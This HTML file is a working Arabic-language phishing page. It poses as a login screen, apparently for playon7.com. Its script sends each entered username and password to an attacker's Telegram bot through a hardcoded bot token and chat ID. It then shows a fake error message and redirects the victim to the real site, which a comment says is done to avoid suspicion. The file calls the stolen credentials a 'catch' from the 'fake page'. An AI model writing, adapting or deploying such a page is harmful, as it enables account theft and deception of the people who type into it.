<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سجل الدخول</title>
    <style>
        body { background-color: #0b021d; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 90%; max-width: 400px; padding: 20px; text-align: center; }
        h2 { color: #d600d6; font-size: 28px; margin-bottom: 10px; }
        p { color: #ccc; margin-bottom: 30px; }
        .input-group { text-align: right; margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #fff; font-size: 14px; }
        label span { color: red; }
        input[type="text"], input[type="password"] { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #333; background: #1a0b33; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; background-color: #d600d6; color: white; font-size: 18px; cursor: pointer; font-weight: bold; }
        .footer-links { margin-top: 20px; color: #d600d6; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

<div class="login-card">
    <div style="text-align: right; color: #ccc; margin-bottom: 40px;">مغلق</div>
    <h2>مرحباً بعودتك</h2>
    <p>دعنا نسجل دخولك. اشتفنالك!</p>

    <div class="input-group">
        <label>Username <span>*</span></label>
        <input type="text" id="user" placeholder="أدخل اسم المستخدم الخاص بك">
    </div>

    <div class="input-group">
        <label>كلمة السر <span>*</span></label>
        <input type="password" id="pass" placeholder="أدخل رقمك السري">
    </div>

    <button class="btn" onclick="sendData()">سجل الدخول</button>
    
    <div style="margin-top: 20px;">
        <a href="#" class="footer-links">نسيت رقمك السري؟</a><br><br>
        <span style="color: #ccc;">هل لديك حساب؟</span> <a href="#" class="footer-links">انضم إلينا</a>
    </div>
</div>

<script>
function sendData() {
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const token = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
    const chat_id = "8665747715";
    
    if(user && pass) {
        const text = `🚀 **صيد جديد من الصفحة المزورة**\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

        fetch(url).then(() => {
            alert("حدث خطأ في النظام، يرجى المحاولة لاحقاً");
            // توجيه الضحية للموقع الحقيقي بعد الصيد لإبعاد الشبهة
            window.location.href = "https://playon7.com"; 
        });
    } else {
        alert("يرجى ملء جميع الحقول");
    }
}
</script>

</body>
</html>
